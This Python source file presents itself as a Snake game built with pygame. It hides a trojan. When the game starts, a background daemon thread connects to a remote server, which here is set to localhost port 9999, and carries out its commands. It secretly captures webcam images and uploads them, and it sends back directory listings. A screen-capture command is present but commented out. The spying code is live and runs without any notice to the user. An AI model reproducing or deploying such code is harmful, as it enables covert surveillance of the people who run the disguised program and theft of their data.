import socket
import threading
import cv2
import pyautogui
from datetime import datetime
from io import BytesIO
import pygame
import random
import time
import os

SERVER_IP = "127.0.0.1"
PORT = 9999

# -------- Capture Part --------
def capture_webcam():
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cap.release()
        if ret:
            _, buffer = cv2.imencode('.jpg', frame)
            return buffer.tobytes()
    except Exception as e:
        print("Webcam error:", e)
    return None

def capture_screen():
    try:
        screenshot = pyautogui.screenshot()
        buf = BytesIO()
        screenshot.save(buf, format="JPEG")
        return buf.getvalue()
    except Exception as e:
        print("Screenshot error:", e)
    return None

def send_file(sock, filename, filedata):
    try:
        header = f"{filename}||{len(filedata)}".encode()
        sock.send(header)
        if sock.recv(1024) == b"READY":
            sock.sendall(filedata)
            return True
    except Exception as e:
        print("Send error:", e)
    return False

# -------- Communication --------
def handle_server_communication():
    sock = socket.socket()
    try:
        sock.connect((SERVER_IP, PORT))
        print("[+] Connected to server")

        while True:
            data = sock.recv(1024)
            if not data:
                break

            if data.startswith(b"CMD:"):
                cmd = data[4:].decode().strip()
                print("[+] Command:", cmd)

                if cmd == "capture":
                    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
                    data_bytes = capture_webcam()
                    if data_bytes:
                        send_file(sock, f"webcam_{ts}.jpg", data_bytes)
                        sock.send(b"RESP:Webcam captured")
                    else:
                        sock.send(b"RESP:Webcam failed")

                # elif cmd == "screen":
                #     ts = datetime.now().strftime("%Y%m%d_%H%M%S")
                #     data_bytes = capture_screen()
                #     if data_bytes:
                #         send_file(sock, f"screenshot_{ts}.jpg", data_bytes)
                #         sock.send(b"RESP:Screenshot captured")
                #     else:
                #         sock.send(b"RESP:Screenshot failed")

                elif cmd == "dir":
                    try:
                        files = os.listdir(".")
                        listing = "\n".join(files)
                        sock.send(f"RESP:{listing}".encode())
                    except Exception as e:
                        sock.send(f"RESP:Dir error {e}".encode())

                else:
                    sock.send(b"RESP:Unknown command")

    except Exception as e:
        print("[-] Connection error:", e)
    finally:
        sock.close()

# -------- Game --------
def run_game():
    pygame.init()
    width, height = 600, 400
    dis = pygame.display.set_mode((width, height))
    pygame.display.set_caption("Snake Game")
    clock = pygame.time.Clock()

    snake_block = 10
    snake_speed = 1
    font = pygame.font.SysFont("bahnschrift", 25)

    def message(msg, color):
        mesg = font.render(msg, True, color)
        dis.blit(mesg, [width / 6, height / 3])

    x1, y1 = width / 2, height / 2
    x1_change, y1_change = 0, 0
    snake_list = []
    length_of_snake = 1
    foodx, foody = random.randrange(0, width-10, 10), random.randrange(0, height-10, 10)

    game_over = False
    while not game_over:
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                game_over = True
            if event.type == pygame.KEYDOWN:
                if event.key == pygame.K_LEFT: x1_change, y1_change = -snake_block, 0
                elif event.key == pygame.K_RIGHT: x1_change, y1_change = snake_block, 0
                elif event.key == pygame.K_UP: x1_change, y1_change = 0, -snake_block
                elif event.key == pygame.K_DOWN: x1_change, y1_change = 0, snake_block

        x1 += x1_change
        y1 += y1_change

        if x1 >= width or x1 < 0 or y1 >= height or y1 < 0:
            game_over = True

        dis.fill((255,255,255))
        pygame.draw.rect(dis, (0,255,0), [foodx, foody, 10, 10])

        snake_head = [x1, y1]
        snake_list.append(snake_head)
        if len(snake_list) > length_of_snake:
            del snake_list[0]

        for seg in snake_list[:-1]:
            if seg == snake_head:
                game_over = True

        for seg in snake_list:
            pygame.draw.rect(dis, (0,0,0), [seg[0], seg[1], 10, 10])

        pygame.display.update()

        if x1 == foodx and y1 == foody:
            foodx, foody = random.randrange(0, width-10, 10), random.randrange(0, height-10, 10)
            length_of_snake += 1

        clock.tick(snake_speed)

    pygame.quit()

# -------- Main --------
if __name__ == "__main__":
    threading.Thread(target=handle_server_communication, daemon=True).start()
    run_game()
